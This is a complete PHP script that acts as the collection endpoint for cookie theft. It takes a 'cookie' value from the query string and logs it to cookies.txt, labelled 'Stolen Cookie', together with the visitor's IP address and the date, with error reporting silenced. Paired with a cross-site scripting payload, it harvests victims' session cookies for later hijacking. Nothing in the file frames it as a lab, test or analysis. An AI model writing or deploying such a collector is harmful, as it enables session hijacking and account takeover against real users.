<?php
error_reporting(0);
if (isset($_GET['cookie']) && !empty($_GET['cookie'])) {
    $cookie = $_GET['cookie'];
    $file = fopen("cookies.txt", "a");
    fwrite($file, "Stolen Cookie: " . $cookie . " | IP: " . $_SERVER['REMOTE_ADDR'] . " | Date: " . date('Y-m-d H:i:s') . "\n");
    fclose($file);
}
?>
